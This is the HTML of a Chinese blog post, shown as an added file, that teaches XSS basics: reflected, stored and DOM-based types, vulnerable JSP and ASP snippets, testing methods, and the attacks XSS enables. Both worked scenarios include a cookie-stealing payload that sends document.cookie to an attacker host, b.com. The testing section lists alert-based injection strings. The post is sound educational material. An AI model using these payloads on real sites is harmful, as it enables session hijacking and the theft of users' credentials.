@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 op">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全—XSS基础">
+<meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/index.html">
+<meta property="og:site_name" content="xxC1&#39;s blog">
+<meta property="og:description" content="一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 op">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-01-16T09:40:30.507Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全—XSS基础">
+<meta name="twitter:description" content="一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;amp;lt;body&amp;gt;或&amp;amp;lt;frameset&amp;gt;每次出现时被自动创建 op">
+  <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Web安全—XSS基础 | xxC1's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+<!--
+    <a href="https://github.com/xx-C1" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+-->
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxC1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">想学的太多，懂得的太少。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xx_C1">
+      <meta itemprop="description" content="Cyberspace Security">
+      <meta itemprop="image" content="/images/dxx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxC1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Web安全—XSS基础
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2018-07-08 21:00:00" itemprop="dateCreated datePublished" datetime="2018-07-08T21:00:00+08:00">2018-07-08</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-16 17:40:30" itemprop="dateModified" datetime="2021-01-16T17:40:30+08:00">2021-01-16</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/Browser端安全/" itemprop="url" rel="index"><span itemprop="name">Browser端安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          <span id="busuanzi_container_page_pv">
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+            </span>
+            阅读量: <span id="busuanzi_value_page_pv"></span>次
+          </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>6.2k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>10 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="一、JavaScript相关语法"><a href="#一、JavaScript相关语法" class="headerlink" title="一、JavaScript相关语法"></a>一、JavaScript相关语法</h3><h4 id="（一）基础语法"><a href="#（一）基础语法" class="headerlink" title="（一）基础语法"></a><strong>（一）基础语法</strong></h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写在[<span class="string">removed</span>][<span class="symbol">removed</span>]标签中</span><br><span class="line">变量定义：var xxx</span><br><span class="line">.的用处：连接字符</span><br></pre></td></tr></table></figure><h4 id="（二）wiondow-open-：是window对象中的open-方法"><a href="#（二）wiondow-open-：是window对象中的open-方法" class="headerlink" title="（二）wiondow.open()：是window对象中的open()方法"></a><strong>（二）wiondow.open()：是window对象中的open()方法</strong></h4><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">而<span class="built_in">window</span>对象是javascript中的顶层对象，代表一个浏览器窗口</span><br><span class="line"> </span><br><span class="line">在&amp;<span class="keyword">lt</span>;body&gt;或&amp;<span class="keyword">lt</span>;frameset&gt;每次出现时被自动创建</span><br><span class="line"> </span><br><span class="line"><span class="keyword">open</span>()方法用于打开一个新的浏览器窗口或查找一个已命名的窗口</span><br></pre></td></tr></table></figure><a id="more"></a> 
+
+
+
+ 
+
+
+
+<h4 id="（三）document-password-pass-value"><a href="#（三）document-password-pass-value" class="headerlink" title="（三）document.password.pass.value"></a><strong>（三）document.password.pass.value</strong></h4> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document是javascript里面的文档对象，里面含有很多的属性和方法，而value值就是属性。</span><br><span class="line"></span><br><span class="line">在这里是获得password<span class="selector-class">.password</span><span class="selector-class">.pass</span><span class="selector-class">.value</span>的值。</span><br></pre></td></tr></table></figure>
+
+<h4 id="（四）javascript-alert"><a href="#（四）javascript-alert" class="headerlink" title="（四）javascript alert()"></a><strong>（四）javascript</strong> <strong>alert()</strong></h4> <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">警示对话框</span><br><span class="line">  函数括号内的文本信息显示在对话框中，把它称为警示对话框，要显示的信息放置在括号内，该对画框包含一个确认<span class="string">"确认"</span>按钮。用户阅读完之后所显示的信息后，只需要点击该按钮就可以关闭对话框，在这里就是一个弹出框。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、XSS定义"><a href="#二、XSS定义" class="headerlink" title="二、XSS定义"></a>二、XSS定义</h3><ul>
+<li>跨站脚本攻击(Cross Site Scripting)，缩写为XSS。</li>
+<li>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</li>
+<li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML</li>
+<li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容</li>
+</ul>
+<h3 id="三、-XSS的原理"><a href="#三、-XSS的原理" class="headerlink" title="三、 XSS的原理"></a><strong>三、 XSS的原理</strong></h3><ul>
+<li><strong>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）</strong></li>
+<li><strong>诱使受害者打开受到攻击的服务器URL</strong></li>
+<li><strong>受害者在Web浏览器中打开URL，恶意脚本执行</strong></li>
+</ul>
+<h3 id="四、XSS的攻击方式"><a href="#四、XSS的攻击方式" class="headerlink" title="四、XSS的攻击方式"></a><strong>四、XSS的攻击方式</strong></h3><h4 id="（一）反射型"><a href="#（一）反射型" class="headerlink" title="（一）反射型"></a><strong>（一）反射型</strong></h4><ul>
+<li>DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。</li>
+<li>发送请求时，XSS代码出现在URL中(反射型的典型特征)，作为输入提交到服务器端，服务器端解析后响应(search中包含XSS代码，可以是js或者HTML或者CSS)，XSS代码随着响应内容一起传回浏览器，最后浏览器解析执行XSS代码，这个过程像一个反射，所以叫做反射型XSS。</li>
+<li>注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的而称为非持久型XSS，则是因为这种攻击方式具有一次性。</li>
+</ul>
+<h5 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a><strong>场景一</strong></h5><ul>
+<li>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span><span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com?content=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">window</span>.open(“www.b.com?param=”+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com</li>
+<li>b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！</li>
+<li>这个过程中， 受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script& gt;，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己。</li>
+</ul>
+<h4 id="（二）存储型（Stored-XSS）"><a href="#（二）存储型（Stored-XSS）" class="headerlink" title="（二）存储型（Stored XSS）"></a><strong>（二）存储型（</strong>Stored XSS）</h4><ul>
+<li>存储型XSS和反射型的XSS差别就在于，<strong>存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。</strong></li>
+<li>这种攻击多见于论坛<strong>，</strong>攻击者在发帖的过程中</li>
+</ul>
+<h5 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a><strong>场景二</strong></h5><ul>
+<li>a.com可以发文章， 我登录后在a.com中发布了一篇文章，文章中包含了恶意代 码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)< /script>，保存文章。</li>
+<li>这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务 器上，攻击成功！这个过程中，受害者是多个人。</li>
+<li>Stored XSS漏洞危害性更大，危害面更广</li>
+</ul>
+<h4 id="（三）DOM（Document-object-model）型XSS"><a href="#（三）DOM（Document-object-model）型XSS" class="headerlink" title="（三）DOM（Document object model）型XSS"></a><strong>（三）DOM（</strong>Document object model）型XSS</h4><ul>
+<li><p>其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互</p>
+</li>
+<li><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。所以，受客户端浏览器的脚本代码所影响。</p>
+</li>
+<li><p>客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。</p>
+</li>
+<li><ul>
+<li>换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。</li>
+<li>另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</li>
+</ul>
+</li>
+</ul>
+<h3 id="五、XSS漏洞测试"><a href="#五、XSS漏洞测试" class="headerlink" title="五、XSS漏洞测试"></a><strong>五、XSS漏洞测试</strong></h3><h4 id="（一）方法一"><a href="#（一）方法一" class="headerlink" title="（一）方法一"></a><strong>（一）方法一</strong></h4><ul>
+<li><p>查看代码，查找关键的变量,  客户端将数据传送给Web 服务端一般通过三种方式</p>
+</li>
+<li><ul>
+<li>Querystring</li>
+<li>Form表单</li>
+<li>cookie</li>
+</ul>
+</li>
+<li><p>例如在ASP的程序中，通过Request对象获取客户端的变量</p>
+</li>
+</ul>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="keyword">strUserCode </span>=  Request.QueryString(“<span class="meta">code</span>”)<span class="comment">;</span></span><br><span class="line">	<span class="keyword">strUser </span>=  Request.Form(“USER”)<span class="comment">;</span></span><br><span class="line">	<span class="keyword">strID </span>=    Request.Cookies(“ID”)<span class="comment">;</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>假如变量没有经过htmlEncode处理， 那么这个变量就存在一个XSS漏洞</strong></li>
+</ul>
+<h4 id="（二）方法二"><a href="#（二）方法二" class="headerlink" title="（二）方法二"></a><strong>（二）方法二</strong></h4><ul>
+<li>准备测试脚本</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--</span></span><br><span class="line"><span class="comment">"onclick="alert(document.cookie)</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在网页中的Textbox或者其他能输入数据的地方，输入这些测试脚本， 看能不能弹出对话框，能弹出的话说明存在XSS漏洞</li>
+<li>在URL中查看有那些变量通过URL把值传给Web服务器， 把这些变量的值退换成我们的测试的脚本。 然后看我们的脚本是否能执行</li>
+</ul>
+<h4 id="（三）方法三"><a href="#（三）方法三" class="headerlink" title="（三）方法三"></a><strong>（三）方法三</strong></h4><ul>
+<li>自动化测试XSS漏洞或者工具测试</li>
+<li>现在已经有很多XSS扫描工具了。 实现XSS自动化测试非常简单，只需要用HttpWebRequest类。</li>
+<li>把包含xss 测试脚本。发送给Web服务器。 然后查看HttpWebResponse中，我们的XSS测试脚本是否已经注入进去了</li>
+</ul>
+<h3 id="六、攻击方式"><a href="#六、攻击方式" class="headerlink" title="六、攻击方式"></a><strong>六、攻击方式</strong></h3><h4 id="常见容易出现XSS漏洞的地方"><a href="#常见容易出现XSS漏洞的地方" class="headerlink" title="常见容易出现XSS漏洞的地方"></a>常见容易出现XSS漏洞的地方</h4><h5 id="1-数据交互的地方"><a href="#1-数据交互的地方" class="headerlink" title="1.数据交互的地方"></a><strong>1.数据交互的地方</strong></h5><ul>
+<li>get、post、cookies、headers</li>
+<li>反馈与浏览</li>
+<li>富文本编辑器</li>
+<li>各类标签插入和自定义</li>
+</ul>
+<h5 id="2-数据输出的地方"><a href="#2-数据输出的地方" class="headerlink" title="2.数据输出的地方"></a><strong>2.数据输出的地方</strong></h5><ul>
+<li><p>用户资料</p>
+</li>
+<li><p>关键词、标签、说明</p>
+</li>
+<li><p>文件上传</p>
+</li>
+<li><p>反射型XSS测试点：网站的搜索栏、用户登录入口、输入表单等地方</p>
+</li>
+<li><p>存储型XSS测试点：论坛、博客、留言板、网站的留言、评论、日志等交互处</p>
+</li>
+</ul>
+<h4 id="（一）反射性XSS"><a href="#（一）反射性XSS" class="headerlink" title="（一）反射性XSS"></a><strong>（一）反射性XSS</strong></h4><ul>
+<li><p><strong>1.常见注入点</strong></p>
+<ul>
+<li>网站的搜索栏、用户登录入口、输入表单等地方</li>
+</ul>
+</li>
+<li><p><strong>2.攻击方式</strong></p>
+<ul>
+<li>通过各种方式将包含XSS代码的恶意链接发送给目标用户</li>
+<li>比如：邮件、吸引眼球的图片....</li>
+</ul>
+</li>
+</ul>
+<h4 id="（二）存储型XSS"><a href="#（二）存储型XSS" class="headerlink" title="（二）存储型XSS"></a><strong>（二）存储型XSS</strong></h4><ul>
+<li><strong>1.常见注入点</strong><ul>
+<li>论坛、博客、留言板、网站的留言、评论、日志等交互处</li>
+</ul>
+</li>
+<li><strong>2.攻击方式</strong><ul>
+<li>在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。</li>
+<li>随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行</li>
+</ul>
+</li>
+</ul>
+<h4 id="（三）DOM型XSS"><a href="#（三）DOM型XSS" class="headerlink" title="（三）DOM型XSS"></a><strong>（三）DOM型XSS</strong></h4><ul>
+<li><p><strong>1.常见注入点</strong></p>
+<ul>
+<li>通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。</li>
+</ul>
+</li>
+<li><p><strong>2.攻击方式</strong></p>
+</li>
+<li><p>用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p>
+</li>
+</ul>
+<h3 id="七、XSS安全性分析"><a href="#七、XSS安全性分析" class="headerlink" title="七、XSS安全性分析"></a><strong>七、XSS安全性分析</strong></h3><h5 id="（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"><a href="#（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意" class="headerlink" title="（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意"></a><strong>（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意</strong></h5><ul>
+<li>js的执行环境受到严格限制并只有非常有限的权限访问用户的文件和操作系统。</li>
+<li>事实上，现在就可以打开浏览器的脚本控制台立刻执行任何你想执行的脚本，几乎不可能对你的电脑造成任何的伤害。</li>
+<li>但是恶意脚本有以下的权限<ul>
+<li>js有权访问一些用户的敏感信息，比如cookie</li>
+<li>js能够通过XMLHttpRequest或者其他一些机制发送带有任何内容的HTTP请求到任何地址</li>
+<li>js能够通过DOM操作方法对当前页面的HTML做任意修改</li>
+</ul>
+</li>
+</ul>
+<h5 id="（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击"><a href="#（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击" class="headerlink" title="（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击"></a><strong>（二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击</strong></h5><ul>
+<li><strong>1.Cookie窃取</strong>：攻击者能够通过document.cookie访问受害者与网站关联的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。</li>
+<li><strong>2.记录用户行为（Keylogging）</strong>：攻击者可以使用 addEventListener方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。</li>
+<li><strong>3.钓鱼网站（Phishing）</strong>：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的action属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息</li>
+<li><strong>4.利用植入Flash，通过crossdomain权限设置进一步获取更高权限</strong>；或者利用Java等得到类似的操作。</li>
